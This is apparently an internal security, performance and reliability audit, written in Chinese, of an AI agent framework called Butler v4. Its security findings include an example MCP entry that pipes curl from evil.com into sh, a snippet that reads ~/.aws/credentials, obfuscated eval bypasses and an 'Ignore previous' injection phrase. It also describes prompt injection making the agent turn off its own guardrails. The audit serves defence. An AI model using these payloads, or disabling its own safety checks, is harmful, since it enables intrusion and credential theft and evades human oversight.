# Butler v4 项目深度审计 — Sprint 8 (2026-06)

> 范围：Sprint 7 修复 10 项 + 7 处断链**之后**剩余的真实问题。
> 上游：`project-deep-audit-2026-06.md`（Sprint 7）；Sprint 7 已修问题不在本表重复。
> 流程：4 个并行 subagent 扫描（安全 / 性能 / 可靠性 / 测试）→ 独立复检 → 归档。

## 0. 审计元信息

- **执行时间**: 2026-06-02
- **执行方式**: 4 subagent 并行 + 复检人对 4 个 CRITICAL 项逐一取证
- **依赖前置**: Sprint 7 全部 10 项修复已 commit（10 个 commit + 1 个 audit doc，已推 origin/main）
- **基线**: pytest 2788 通过 / 82 预存在失败（与 Sprint 7 修复无关）

## 1. 总体结论

### 1.1 项目总评

Sprint 7 修掉一批典型的一阶问题后，剩余项集中在**三个深层共因**：

1. **配置面 = 攻击面** — `butler_config` 工具 + 几十个 `BUTLER_*` env var 拼出一个"运行时配置图"；任何 prompt 注入都可在几轮内把 IO 守门 / doom-loop / execute_code 全部关掉。安全 #1。
2. **写路径缺乏真·原子** — outbox / state / push queue / mcp install 等多步写全程靠"读→改→写"，崩溃后产生孤儿 `.tmp` / 双发 / 状态漂移。可靠性 #1-#3、#14；性能 #4、#16-#17。
3. **可观测性塌方** — `/health` 不报 outbox pending、circuit-breaker、daemon 线程、idempotency 命中率；异常被吞掉后无任何 metric 路径。性能 #7-#8、可靠性 #9-#10、#17。

测试侧还有 4 个**关键路径无 e2e**：`agent_loop` 真 LLM 失败重试、`wechat_ilink` 鉴权重连限流、runtime stale-lock takeover、memory write→index→retrieve 端到端。

### 1.2 风险分布（79 项去重后）

| 维度 | CRITICAL | HIGH | MEDIUM | LOW | 小计 |
|------|---------:|-----:|-------:|----:|-----:|
| 安全 | 2 | 5 | 2 | 0 | 9 |
| 性能 | 0 | 6 | 9 | 5 | 20 |
| 可靠性 | 1 | 6 | 9 | 4 | 20 |
| 测试缺口 | 1 | 6 | 18 | 5 | 30 |
| **合计** | **4** | **23** | **38** | **14** | **79** |

### 1.3 4 个 CRITICAL 项（已逐一取证）

| ID | 位置 | 问题 | 证据 |
|----|------|------|------|
| SEC-1 | `butler/config_service.py:66,68,69,81` + 138 | `butler_config` 工具可一键关闭 doom-loop / IO guardrail / read-before-edit / execute_code；`os.environ[key] = value` 立即生效 | `_MUTABLE_KEYS` 注册了 4 个安全类 key；`config_set` 第 138 行直写 `os.environ`；无 Owner 二次确认 |
| SEC-2 | `butler/permissions/approvals.py:124-126` | `/批准一次` 指纹校验失败时 fallback 到 pending 字典本身，等于**完全绕过指纹** | 第 125 行 `row = pending if ...fingerprint == fp else None`；第 127 行 `if row is None and isinstance(pending, dict): row = pending` |
| REL-1 | `butler/gateway/durable_outbox.py:75-96` | `_transition_outbox_entry` 三步非原子：读 pending → `_write_entry`（裸 `write_text`）→ `pending.replace(target)`；崩溃在第②步会双发或状态漂移 | 第 80-95 行；`_write_entry` 第 45-47 行裸 `write_text`；docstring 自承 single-process only |
| TST-1 | `butler/gateway/inbound_pipeline.py` | 453 行 pipeline 模块**无任何外部 import**（除自身 docstring 引用外 0 命中），是 `ButlerMessageHandler.handle_message` 抽取后未接管的死代码 | `grep -rn "from butler.gateway.inbound_pipeline\|run_inbound_pipeline"` 全仓 0 命中；`pytest tests/ -k inbound_pipeline` 0 命中 |

### 1.4 优先修复 Top 10（按 ROI 排序）

| 序 | 维度 | ID | 严重 | 位置 | 一句话 | 修复成本 |
|---|------|----|------|------|--------|---------|
| 1 | 安全 | SEC-1 | 🔴 | `config_service.py` | 把安全类 key 从 `_MUTABLE_KEYS` 移出或强制 Owner 二次确认 | 中（白名单分裂 + approval gate） |
| 2 | 安全 | SEC-2 | 🔴 | `approvals.py:124-126` | 删 fallback 分支；fingerprint 不匹配直接拒绝 + 写审计 | 极低（删 2 行 + 加 1 行） |
| 3 | 可靠性 | REL-1 | 🔴 | `durable_outbox.py:75-96` | 三步改为 `tmp.write_text + os.replace` 原子 + `flock(LOCK_EX)` 跨进程 | 中 |
| 4 | 测试 | TST-1 | 🔴 | `inbound_pipeline.py:1-453` | 删除死代码（最安全）或补 6 个 e2e | 低（删）或中（补测试） |
| 5 | 安全 | SEC-3 | 🟠 | `owner_gate.py:58-64` | 默认 fail-closed：非微信平台 / owner 列表空 → 拒绝 | 极低（改 2 行 default） |
| 6 | 安全 | SEC-4 | 🟠 | `mcp/config.py:216-221` | `McpServerConfig.args` 加白名单 + 禁 `-c/-e/eval` | 中 |
| 7 | 安全 | SEC-5 | 🟠 | `wechat_ilink.py:1507,1916,1922` | `send` / `send_wechat_direct` / `format_message` 出口前调 `scrub_outbound_text` | 低（3 行 import + 3 处 call） |
| 8 | 安全 | SEC-6 | 🟠 | `path_safety.py:268` | `str.startswith` 改 `Path.is_relative_to` | 低（1 行） |
| 9 | 可靠性 | REL-2 | 🟠 | `durable_outbox.py:107-124` | `list_pending_outbox` 加 `flock`；与 #3 联动 | 中 |
| 10 | 可靠性 | REL-3 | 🟠 | `gateway/platforms/helpers.py:11-15` | `atomic_json_write` 替换为 `butler.io.atomic_write`（含 fsync + O_NOFOLLOW） | 低 |

### 1.5 推荐下一步

- 短期：先修 SEC-2 / SEC-3 / SEC-5 / SEC-6 / REL-2 / REL-3 — 共 6 项 1-2 天工作量，其中 4 项 5 分钟级
- 中期：SEC-1（涉及审批流重构）+ REL-1（outbox 跨进程锁）+ TST-1（决定删还是补测）
- 长期：性能侧 #1-#6（连接池 / 异步化 / cache），测试侧 H1-H7（关键路径 e2e）
- 仍未触及的 65+ 项归入 Sprint 9 候选

## 2. 安全维度（Sprint 8）

### 2.1 [🔴 CRITICAL] SEC-1 `butler_config` 工具可关闭所有安全护栏

- **位置**: `butler/config_service.py:66,68,69,81`（注册）+ `:138`（写入 `os.environ`）
- **代码**:
  ```python
  # config_service.py:66
  _register("BUTLER_DOOM_LOOP_MODE", "安全", "重复拦截模式（block/ask）", "block", vtype="str")
  _register("BUTLER_IO_GUARDRAIL", "安全", "入站明文密钥/过长消息检测", "1")
  _register("BUTLER_READ_BEFORE_EDIT", "安全", "编辑前须先读取文件", "1")
  # line 81
  _register("BUTLER_EXECUTE_CODE", "开发", "代码沙箱执行", "0")
  # line 138
  os.environ[key] = value
  ```
- **复检**: 已确认 4 个安全类 key 在 `_MUTABLE_KEYS` 注册，`config_set` 第 138 行直接 `os.environ[key] = value` 且 level A 立即生效；`butler_config` 工具对 Agent 开放
- **影响**: Prompt 注入 → `butler_config set BUTLER_IO_GUARDRAIL 0` + `set BUTLER_EXECUTE_CODE 1` + `set BUTLER_DOOM_LOOP_MODE ask` 后，所有入站明文密钥检测、Doom-loop 拦截、代码沙箱门禁全部失守
- **建议**:
  1. 把 `BUTLER_DOOM_LOOP_MODE` / `BUTLER_IO_GUARDRAIL` / `BUTLER_READ_BEFORE_EDIT` / `BUTLER_EXECUTE_CODE` / `BUTLER_ENABLE_TERMINAL` / `BUTLER_ENABLE_GIT_PUSH` / `BUTLER_ENABLE_DOWNLOAD` 7 个 key 移出 `_MUTABLE_KEYS`（运行时不可改）
  2. 写路径加 `BUTLER_PERMISSION_ONCE` 二次确认

### 2.2 [🔴 CRITICAL] SEC-2 `/批准一次` 指纹校验被绕过

- **位置**: `butler/permissions/approvals.py:124-126`
- **代码**:
  ```python
  row = pending if isinstance(pending, dict) and pending.get("fingerprint") == fp else None
  if row is None and isinstance(pending, dict):
      row = pending   # ← fallback 绕过
  ```
- **复检**: 已确认两行连写；前端解析错误 / emoji 转义 / Unicode 归一化任何一处制造 `fp` mismatch 都会被这行兜底成"批准"
- **影响**: 所有走 `grant_once` 流的高风险工具（写文件 / 终端 / 下载）；本质是 confirm UI 的反欺骗机制失效
- **建议**:
  1. 删除第 126 行回退分支
  2. `row is None` 直接 `return "指纹不匹配；请重新发起待批准项"`
  3. 不匹配事件写审计日志（便于事后分析）

### 2.3 [🟠 HIGH] SEC-3 Owner 网关在空配置 + 非微信平台下默认放行

- **位置**: `butler/gateway/owner_gate.py:58-64`
- **代码**:
  ```python
  if plat not in ("wechat", "weixin"):
      return True            # ← 非微信平台无条件放行
  allowed = owner_wechat_ids()
  if not allowed:
      return True            # ← 配置空时无条件放行
  ```
- **影响**: 默认部署时 `BUTLER_OWNER_WECHAT_ID` 未设置 → 任何外部平台（CLI / Telegram / cron / webhook）调用 `/项目 新建` 等 Owner-only 指令被允许；新增平台（飞书 / Slack）同样 fail-open
- **建议**: 默认返回 `False`；仅在 `BUTLER_PROJECT_CREATE_OPEN=1` 显式开启时放行；所有 `is_gateway_owner` 调用点全审计

### 2.4 [🟠 HIGH] SEC-4 MCP stdio 仅校验命令名，不校验 args

- **位置**: `butler/mcp/config.py:216-221`（`validate_stdio_command`）
- **代码**:
  ```python
  cmd = Path(config.command).name if "/" in config.command else config.command
  allowed = stdio_allow_commands()
  if cmd not in allowed:
      return f"stdio command '{cmd}' not in ..."
  return None    # ← args 完全不检查
  ```
- **影响**: 远程 MCP 目录条目 `{"command":"python3","args":["-c","import os;os.system('curl evil.com|sh')"]}` 通过校验 → 用户 `/mcp install` 一键安装 → Agent 工具直接 RCE
- **建议**:
  1. `args` 加白名单（仅允许 `-m`, `--`, 文件路径后缀白名单），禁用 `-c/-e/eval`
  2. `McpServerConfig` 启用 hash-pinned 远程目录签名校验

### 2.5 [🟠 HIGH] SEC-5 出站 PII 脱敏未覆盖 `WeChatAdapter.send` 与 `send_wechat_direct`

- **位置**: `butler/gateway/platforms/wechat_ilink.py:1507`（`send`）/:1916（`format_message`）/:1922（`send_wechat_direct`）
- **复检**: `grep` 确认 `wechat_ilink.py` 全文件不 `import scrub_outbound_text`；仅 `outbound_bridge.py` 3 处与 `completion_notify.py` 1 处使用
- **影响**: Sprint 7 在 `pii_scrub.py` 增强 5 类 PII 规则，但**主路径**未消费；Agent 读 `~/.aws/credentials` 后常规 `adapter.send()` 原文发回用户
- **建议**:
  1. `WeChatAdapter.send` 出口前调 `scrub_outbound_text(text)`
  2. `format_message` 改为先 `scrub` 再 `normalize_markdown`
  3. `send_wechat_direct` 同款

### 2.6 [🟠 HIGH] SEC-6 `_resolve_tool_path` `str.startswith` 路径越权

- **位置**: `butler/tools/path_safety.py:268`
- **代码**:
  ```python
  if root is not None and not str(target).startswith(str(root.resolve())):
  ```
- **影响**: `root = /var/butler`、`target = /var/butler2/secrets.txt` 时 `str.startswith` 判 True，错误放行；软链 `/var/butler2 → /etc` 即突破；覆盖 `read_file/write_file/list_dir` 全部文件类工具
- **建议**: 改 `Path.resolve().is_relative_to(root.resolve())`（Py 3.9+）

### 2.7 [🟠 HIGH] SEC-7 `execute_code` 沙箱透传真实 `HOME`

- **位置**: `butler/tools/execute_code.py:74-81`
- **代码**:
  ```python
  env = {
      "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
      "HOME": os.environ.get("HOME", "/tmp"),   # ← 透传宿主 HOME
      ...
  }
  ```
- **影响**: `BUTLER_EXECUTE_CODE=1` 时，Agent 提交 `python3 -c "import os;print(open(os.path.expanduser('~/.aws/credentials')).read())"` 沙箱内 `~` 解析为宿主 home，读 `~/.ssh/id_rsa` / `~/.bash_history`
- **建议**: `HOME` 设为 workspace cwd 下临时目录；`unset` `XDG_CONFIG_HOME` / `XDG_DATA_HOME` / `PYTHONPATH` / `SSL_CERT_FILE`

### 2.8 [🟡 MEDIUM] SEC-8 Skill guard 仅正则黑名单

- **位置**: `butler/skills/guard.py:8-44`
- **影响**: `__import__('os').system(b64decode(...))` / `getattr(__builtins__,'ev'+'al')` / `eval(...)` 全部绕过；`Ignore previous` 绕过 prompt-injection 模式
- **建议**: 替换 `ast` 静态分析（禁用 `eval/exec/compile/subprocess/os.system/__import__`）+ 高熵字符串检测；扫描命中默认拒绝安装并写审计

### 2.9 [🟡 MEDIUM] SEC-9 `lobehub_market` `npx -y` 执行任意 npm 包

- **位置**: `butler/registry/skill_sources/lobehub.py:140-163`
- **影响**: `-y` 无交互确认；远程源版本无 pin/SRI；与 `mcp_catalog_remote` 形成两路 npm 供应链入口
- **建议**: pin 到 `package@<sha512>` + `npm view` 预校验；改用本地内置 HTTP 拉取 + 签名校验；至少 `--ignore-scripts` 透传

## 3. 性能维度（Sprint 8）

> 完整 20 项见 §5 附录 A；Top 6 在此列出。

### 3.1 [🟠 HIGH] PERF-1 `observation_store` / `triplets` / `knowledge_db` 仍走 `with self._connect() as conn` 模式

- **位置**: `butler/memory/observation_store.py:27,35,168,187` / `triplets.py:60,99,135,172,179` / `knowledge_db.py:29,50,67`
- **量化**: 7+5+4 = 16 个 `with` 块，每个 add/list/count 都 open+PRAGMA 3 个 syscall；与 Sprint 7 修过的 `ExperienceStore` / `SemanticMemoryIndex` 形成反模式范本
- **建议**: 复用 Sprint 7 模式：`self._conn = self._open_conn()` 持久化

### 3.2 [🟠 HIGH] PERF-2 `hooks/runner.py:522-531` hooks 同步阻塞 event loop

- **位置**: `butler/hooks/runner.py:522-531`
- **量化**: `subprocess.run(["bash", "-c", rule.command], timeout=30)` 在 async 上下文同步 fork；单 turn 通常 2-3 次 hook 触发；最坏单 turn 卡 60-90s
- **建议**: `loop.run_in_executor(None, _run_subprocess, ...)` + `asyncio.Semaphore(4)` 限流

### 3.3 [🟠 HIGH] PERF-3 `semantic_index.search` 全行 json.loads + 阈值在 cos 之后

- **位置**: `butler/memory/semantic_index.py:196-212, 340-348`
- **量化**: 2000 行 × (json.loads + O(1024) dot) ≈ 200-500ms（API embedder）；0.05 阈值在 cos 之后（line 213），50% 不命中行白做
- **建议**: ① BLOB 存 embedding 省 json.loads ② 启动时全表加载到 `_cache: dict[rowid, np.array]` ③ numpy `vecs @ qvec.T` 批量算

### 3.4 [🟠 HIGH] PERF-4 `InMemoryVectorStore._persist` 整文件重写

- **位置**: `butler/memory/vector_store.py:166-169`
- **量化**: N=1000 行 add ≈ 50ms 写、~2MB 重写；高频 batch 写放大 10-100x
- **建议**: 改 append-only JSONL + 启动时一次 load；删除走 tombstone

### 3.5 [🟠 HIGH] PERF-5 `hooks/loader.py` 每次 hook 事件重 parse YAML

- **位置**: `butler/hooks/loader.py:65-105`
- **量化**: 3 个 yaml 文件通常 1-10KB；yaml.safe_load 1KB ≈ 0.5-2ms；PreToolUse + PostToolUse 每次 turn 至少 4 次
- **建议**: 模块级 `functools.lru_cache(maxsize=8)` 按 workspace 缓存

### 3.6 [🟠 HIGH] PERF-6 wechat_ilink 媒体下载串行

- **位置**: `butler/gateway/platforms/wechat_ilink.py:1216-1221`
- **量化**: 同一 message N 个媒体项串行，最坏 `N × (timeout=30s/120s)`；典型 N=2-4，延迟 1-4s
- **建议**: `await asyncio.gather(*[self._collect_media(item, ...) for item in item_list], return_exceptions=True)`

### 3.7 其他 14 项（MEDIUM/LOW）

- PERF-7 `_session_locks` / PERF-8 `TypingTicketCache` 无界增长（dict 永增；建议 `TTLCache(maxsize=4096, ttl=3600)`）
- PERF-9 `strip_think_blocks` 6 次内联 re.sub（建议模块级 `re.compile`）
- PERF-10 `cli/stream.py` `shutil.get_terminal_size()` 3×/行（建议 `__init__` 存一次 + SIGWINCH invalidate）
- PERF-11 `hooks/loader.py:124-128` `match_hook_query` 每次 re.search 重编译
- PERF-12 `OpenAIEmbedder.embed` 无 query-text LRU
- PERF-13 `observation_store.py:193` `LIKE '%' || path || '%'` 前导通配 + OR（全表扫）
- PERF-14 `cosine_similarity` 阈值过滤之前
- PERF-15 `message_queue.py:167` 每次 enqueue 全量 sort
- PERF-16 `runtime/push_queue.py` 整文件 read+rewrite
- PERF-17 `runtime/task_store.py:133-140` update_task 3× IO + fsync
- PERF-18 全项目 0 处 WAL checkpoint（5 个 sqlite DB 全 WAL 无 truncate 调度）
- PERF-19 `_record_access_hits` 10 hits 拼 10 段 OR
- PERF-20 `skills/router.py` embedding cache key 用 `hash(str)`（PYTHONHASHSEED 随机化，跨重启全 miss）

## 4. 可靠性维度（Sprint 8）

### 4.1 [🔴 CRITICAL] REL-1 `_transition_outbox_entry` 三步非原子

- **位置**: `butler/gateway/durable_outbox.py:75-96`
- **代码**:
  ```python
  row = json.loads(pending.read_text(...))      # ① 读
  row["attempts"] = int(row.get("attempts") or 0) + 1
  row["status"] = target_state
  _write_entry(pending, row)                    # ② 写回（裸 write_text）
  pending.replace(target)                       # ③ 移走
  ```
- **影响**: 进程在 ② 后被 SIGKILL → pending 与 target 同名重复存在；replay 时双发；微信平台尤其严重（不可幂等）
- **建议**:
  1. 写 `<state>/<id>.json.tmp` → `os.fsync` → `os.replace` 到 target → 再 `unlink(pending)`
  2. 或加 `flock(LOCK_EX)` 跨进程
  3. 与 REL-3 联动

### 4.2 [🟠 HIGH] REL-2 `atomic_json_write` 名字撒谎 + 6+ 处裸 `write_text`

- **位置**: `butler/gateway/platforms/helpers.py:11-15`（假原子）+ 6 处裸写
  - `durable_outbox.py:46` `_write_entry`（被 enqueue/transition 复用）
  - `runtime/notify.py:57` `_write_last_push_monotonic`
  - `registry/install_pending.py:56` `_save_all`
  - `core/transcript_index.py:145` `_write_index`
  - `registry/mcp_install.py:181,231` lock 与配置
- **影响**: 断电/写一半 → 损坏文件 → 启动恢复失败；密钥文件权限正确但**内容可能为空**
- **建议**:
  1. `atomic_json_write` 替换为 `butler/io/atomic_write.py` 实现（含 fsync + O_NOFOLLOW + try/finally）
  2. 6 处裸 `write_text` 全部改 `atomic_write_text`
  3. 项目内**至少 3 套**"原子写"实现，删除冗余

### 4.3 [🟠 HIGH] REL-3 `runtime/service.py` 锁/执行/审计三阶段非原子

- **位置**: `butler/runtime/service.py:117-124, 142-144`
- **代码**:
  ```python
  try_acquire_lock(...)        # 锁
  runner.execute_job(...)      # 执行
  release_lock(...)            # 释放
  # 写 audit 在 line 142-144 锁外
  ```
- **影响**:
  1. `execute_job` 抛异常时只释放锁，**从不写 audit** → job 状态不可见
  2. `started_at` 在锁内取得，写 audit 在锁外 → 期间另一进程可再次获得锁并并发执行
- **建议**:
  1. 进入锁后立即写 `audit_started` 占位
  2. 异常路径写 `audit_finished`
  3. `release_lock` 在 `finally` 中且是最后清理

### 4.4 [🟠 HIGH] REL-4 `run_due_jobs` 循环无 try/except

- **位置**: `butler/runtime/service.py:316-333`
- **代码**:
  ```python
  for jid in list_due_jobs(...):
      results.append(run_job(...))   # 抛异常则 sweep 终止
  ```
- **影响**: 罕见异常（HTTP/JSON 解析）→ 后续 due job 当天不再触发直到下一个 cron tick
- **建议**: `try: results.append(run_job(...)) except Exception: logger.exception(...); results.append({"success": False, "error": "sweep-crash"})`

### 4.5 [🟠 HIGH] REL-5 `interruptible_client` 中断后线程泄漏

- **位置**: `butler/transport/interruptible_client.py:36-49`
- **影响**: 发起 daemon thread 跑阻塞 HTTP/SSE，主线程 `raise InterruptedError`；daemon thread 仍持有 socket/fd；Python 线程无法强杀，只有进程退出才能回收
- **建议**:
  1. 取消请求必须调 `transport.close()`（httpx/requests session）
  2. 优先用 `httpx.AsyncClient` + `asyncio.timeout` 替换阻塞 daemon 模式

### 4.6 [🟠 HIGH] REL-6 `mcp/manager.py` 句柄 TOCTOU

- **位置**: `butler/mcp/manager.py:54-61, 191-195`
- **影响**: `_handles_for(name)` 返回内部 dict 引用**不在锁内**；`call_tool` 拿到 handle 后 `ensure_connected` — 中间另一线程可关闭/重建
- **建议**: 返回 `(handle, lock)` 或 `dict.copy()`；`ensure_connected` 必须在 `with self._lock` 内重新校验

### 4.7 [🟠 HIGH] REL-7 install_pending 写失败无回滚

- **位置**: `butler/registry/install_pending.py:56` + `mcp_install.py:181`
- **影响**: 写失败仅 `logger.warning`；但**调用方**已修改内存 `pending` 列表 — 下次重启从空文件开始，**静默丢失待装插件**
- **建议**: 写失败抛 `RuntimeError`，CLI 路径报错并阻止进入下一阶段

### 4.8 [🟡 MEDIUM] 4 处模块级 unbounded dict

- `transport/provider_health.py:15` `_STATE` — 跨 provider 永不淘汰
- `mcp/profiles.py:20` `_SESSION_PROFILE`
- `runtime/async_delegate.py:14` `_THREADS`
- `mcp/manager.py` 内部 sessions dict
- **建议**: 全加 `maxlen` + LRU；或集中到 `cachetools.TTLCache`

### 4.9 [🟡 MEDIUM] gateway runner shutdown 顺序缺失

- `gateway/runner.py:201-204` `_reminder_task.cancel()` 未 await；`for adapter in connected: await adapter.disconnect()` 串行
- **建议**: `asyncio.gather(*[adapter.disconnect() for adapter in connected], return_exceptions=True)`

### 4.10 [🟡 MEDIUM] mcp async_runner daemon 循环无 atexit

- `butler/mcp/async_runner.py` 顶层 `asyncio.create_task(_daemon_loop())`，无 atexit
- **建议**: 模块级 `atexit.register(_shutdown_hook)`

### 4.11 [🟡 MEDIUM] time.time vs datetime 混用（索引/缓存层）

- `core/transcript_index.py` / `core/tool_result_cache.py` `time.time()` 与 `datetime.now(timezone.utc)` 混用
- **建议**: 统一 `time.time()`（单调 epoch）作为排序键

### 4.12 其他 8 项

- REL-11 `butler_memory.py:155-160` `close()` 吞所有异常
- REL-12 `runtime/notify.py:57` `_write_last_push_monotonic` 与文件重命名竞态
- REL-13 至少 3 套"真·原子写"实现未复用（缺中央抽象）
- REL-14 `gateway/runner.py` 缺健康端点体现依赖（outbox pending / circuit-breaker / delegate threads）
- REL-15 `durable_outbox.py:107-124` `list_pending_outbox` 自承"无跨进程锁"（与 REL-1 联动）
- REL-16 `provider_health` 计数器溢出（绝对计数 int 单调递增）
- REL-17 `wechat_ilink.py` `disconnect()` 无超时
- REL-18 `audit.py` `try_acquire_lock` corrupt 时返回 True

## 5. 测试缺口维度（Sprint 8）

### 5.1 [🔴 CRITICAL] TST-1 `inbound_pipeline.py` 453 行 0 测试 0 引用

- **位置**: `butler/gateway/inbound_pipeline.py:1-453`
- **证据**:
  ```bash
  $ grep -rn "from butler.gateway.inbound_pipeline\|run_inbound_pipeline" butler/ tests/ docs/
  # 0 命中（除自身 docstring）
  ```
- **影响**: 整条 inbound pipeline（injection_guard → mcp profile → IO guardrail → human_gate → bot_loop_guard → two_phase_confirm → auto_continue → permission → terminal approval → health summary → output formatting）**完全死代码**；生产 `message_handler.handle_message` 走 `handler_helpers` 拼出来的同款逻辑
- **建议**:
  1. **优先删**（最安全，message_handler 实际未引用） — 删 453 行
  2. 否则补 6-8 个 e2e（队列合并 / debounce / drop=old vs drop=new / bot_loop guard 触发 / 人类 gate 拦截 / 错误格式）

### 5.2 [🟠 HIGH] TST-2 wechat_ilink 全模块被覆盖排除

- **位置**: `pyproject.toml:111-112`
- **影响**: 2000 行最热路径**无任何覆盖率数据**；Sprint 7 修过的 5.2.1 / 4.1.2 / 4.1.4 / 3.5.2 4 个修复，**无机制保证以后改不回去**
- **建议**: 删 omit + 补 6 个测试（`_poll_loop` happy path / 重连退避 / auth 失败 / 限流 429 / session_expired 自动重发 / 5.2.1 retain 持有 task）

### 5.3 [🟠 HIGH] TST-3 Agent Loop 5 大 hot path 全靠 mock LLM

- **位置**: `tests/test_agent_loop.py:93-148` + `tests/test_e2e.py:8`
- **影响**: 51 个 `_run_turn_body` 测试全部用 `mock_llm_client` 桩；真 LLM 失败重试 / partial JSON 解析 / streaming 中断 / 上下文超限压缩 0 测试
- **建议**: 加 5 个 e2e：tool 异常被吞 / max_iter 触达 / is_interrupted 立即退 / context overflow 触发 compress / streaming 中断 final_response 不截断

### 5.4 [🟠 HIGH] TST-4 wechat 鉴权/重连/限流 0 测试

- **位置**: `butler/gateway/platforms/wechat_ilink.py:1003 connect() / 1057 disconnect() / 1063+1150 assert self._poll_session is not None`
- **影响**: 任何 iLink 协议 token 格式 / 401 行为变化 → 线上 adapter 死锁无信号
- **建议**: 4 个测试：401 → refresh → retry / 5xx 三连 → exponential backoff / poll_session close → cancel in-flight / `_safe_id` 截断 + base62

### 5.5 [🟠 HIGH] TST-5 Runtime stale lock takeover 0 测试

- **位置**: `butler/runtime/audit.py:67-87`（stale 检测 + unlink + reopen）
- **影响**: `try_acquire_lock` 4 个分支只测 1；stale takeover 路径完全无测试
- **建议**: `test_try_acquire_lock_takes_over_stale_after_2h`（手改 mtime + 7200 秒）

### 5.6 [🟠 HIGH] TST-6 Memory write→index→retrieve 全链路无集成测试

- **位置**: `butler/memory/{butler_memory, observation_store, semantic_index, triplets, vector_store, project_memory}` 6 文件 22k 行
- **量化**: `observation_store.py` **26% 行覆盖**（最差）
- **建议**: 3 个集成：`test_write_index_retrieve_roundtrip` / `test_observation_to_recall_path` / `test_project_memory_facade_full_context`

### 5.7 [🟠 HIGH] TST-7 Tool dispatcher 错误 envelope 0 真实失败测试

- **位置**: `butler/tools/registry.py:178 dispatch_tool`
- **影响**: bash timeout / git clone 失败 / web_fetch 5xx / patch 三方文件已改等真实失败路径几乎全无测试
- **建议**: 5 个：`test_bash_timeout_enveloped_with_TERMINAL_TIMEOUT_code` / `test_web_fetch_5xx_enveloped` / `test_git_command_failed_enveloped_with_GIT_*_code` / `test_tool_dispatcher_audit_event_contains_session_key_even_on_failure`

### 5.8 [🟠 HIGH] TST-8 13 处 `time.sleep` 未 stub（CI flake 风险）

- `tests/test_post_session_unification.py:48(0.3), 112(0.15), 127(0.5)` / `test_memory_m3_m4_smoke.py:107(0.3)` / `test_p0_p1_features.py:249(1.5)` 等
- **建议**: 全部改 `monkeypatch.setattr("time.sleep")` 或注入 `clock` fixture

### 5.9 [🟠 HIGH] TST-9 `test_timeout_push_when_ack_sent` 单测 25 秒

- **位置**: `tests/gateway/test_completion_notify_p2.py:56-63`
- **影响**: 拖慢全 suite；CI 超时风险
- **建议**: 加 `monkeypatch.setenv("BUTLER_RUNTIME_PUSH_COOLDOWN_SECONDS", "0")` 降到 <1s

### 5.10 [🟠 HIGH] TST-10 242 处 "assert x is not None" / "assert result" 弱断言

- **影响**: 测试通过但**未验证任何具体行为**；只能挡"完全崩溃"不能挡"返回错值"
- **建议**: 优先重写 5 类高频弱断言

### 5.11 [🟠 HIGH] TST-11 MemoryDeduplicator adapter 内 0 集成测试

- `tests/gateway/test_wechat_content_dedup.py` 只测 helper class 单元；adapter 内"重复消息静默丢弃"路径 0 测试

### 5.12 其他 18 项

- TST-12 `tests/gateway/test_completion_notify_p2.py::_run_coro` 用 `loop.run_until_complete` 共享 loop 风险
- TST-13 `prefetch_cache` / `mcp async_runner` fire-and-forget 无测试
- TST-14 `butler_home_q` fixture 在 2 个测试文件重复定义
- TST-15 `test_welcome_atomic_under_concurrent_threads` 靠 `time.sleep(0.05)` 扩大 race
- TST-16 452 个 MagicMock 仅 2 处用 `spec=`
- TST-17 `durable_outbox.list_pending_outbox` startup replay 无测试
- TST-18 `push_queue.drain_push_queue` failed/partial 路径无测试
- TST-19 68 处弱类型断言 `assert "X" in data["error"]`
- TST-20 memory 层 0 个 chmod 测试（与 Sprint 7 token 0o600 模式同源）
- TST-21 `config_secrets.write_provider_secret` 0 测试
- TST-22 marker 失衡：unit 202 / module 152 / integration 66 / e2e 3
- TST-23 452 个 MagicMock 90% 无 `assert_called`
- TST-24 conftest 缺共享 fixture
- TST-25 `observation_store.py` 26% 行覆盖（最差）
- TST-26 `task_store.py` 53% 覆盖 + 并发丢失更新无测试
- TST-27 测试命名 30% 不规范
- TST-28 3 个测试用 `assert out` 弱断言
- TST-29 `test_post_session_unification.py` 3 处 sleep 累计 0.95s
- TST-30 `test_durable_outbox.py::test_trim_respects_max_entries` 用 15×0.01s sleep

## 6. 推荐下一步

1. **立即修 Top 10**（§1.4）— 6 项 1-2 天工作量，其中 SEC-2 / SEC-3 / SEC-5 / SEC-6 / REL-2 共 5 项 5 分钟级；其余 4 项 SEC-1 / REL-1 / TST-1 / REL-2 涉及较大改动
2. **Sprint 8 修复阶段完成后**再做 Round 2 复检（再次 4 subagent 扫描）
3. **Sprint 9 候选**:
   - 性能侧 PERF-1 ~ PERF-6（连接池 / 异步化 / cache）
   - 测试侧 TST-2 ~ TST-7（关键路径 e2e）
   - 剩余 65+ MEDIUM/LOW 项分批消化

## 7. 附录

- 附录 A: 性能维度完整 20 项（含 §3.7）
- 附录 B: 可靠性维度完整 20 项（含 §4.8 ~ §4.12）
- 附录 C: 测试缺口维度完整 30 项（含 §5.12）
- 附录 D: Round 1 subagent 报告原文（jsonl 转写保留）
